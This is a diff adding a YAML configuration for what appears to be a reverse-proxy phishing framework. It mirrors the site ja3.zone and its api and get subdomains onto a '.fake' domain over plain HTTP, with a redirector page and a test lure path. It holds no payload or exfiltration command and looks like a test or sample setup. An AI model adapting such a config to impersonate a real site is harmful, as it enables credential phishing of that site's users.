@@ -1,0 +1,58 @@
+campaign:
+  mirrorDomain: 'ja3zone.fake'
+  description: |
+    Mirror for "ja3.zone" site.
+
+proxies:
+  - proxyId: 'default'
+    url: 'http://localhost:8080'
+    isEnabled: true
+
+targets:
+  - targetId: 'apex'
+    accessLevel: 'landing'
+    donorSecure: true
+    donorSub: '@'
+    donorDomain: 'ja3.zone'
+    donorPort: 443
+    mirrorSecure: false
+    mirrorSub: '@'
+    mirrorPort: 3080
+    label: 'ja3zone'
+    mainPage: 'ja3zone/main-page.html'
+    notFoundPage: 'not-found-page.html'
+    faviconIco: 'favicon.ico'
+    robotsTxt: 'robots.txt'
+    isEnabled: true
+
+  - targetId: 'api'
+    accessLevel: 'transparent'
+    donorSecure: true
+    donorSub: 'api'
+    donorDomain: 'ja3.zone'
+    donorPort: 443
+    mirrorSecure: false
+    mirrorSub: 'api'
+    mirrorPort: 3080
+    isEnabled: true
+
+  - targetId: 'get'
+    accessLevel: 'transparent'
+    donorSecure: true
+    donorSub: 'get'
+    donorDomain: 'ja3.zone'
+    donorPort: 443
+    mirrorSecure: false
+    mirrorSub: 'get'
+    mirrorPort: 3080
+    isEnabled: true
+
+redirectors:
+  - redirectorId: simple
+    page: 'ja3zone/simple.html'
+
+lures:
+  - lureId: 'test'
+    path: '/test.asp'
+    redirectorId: 'simple'
+    isEnabled: true
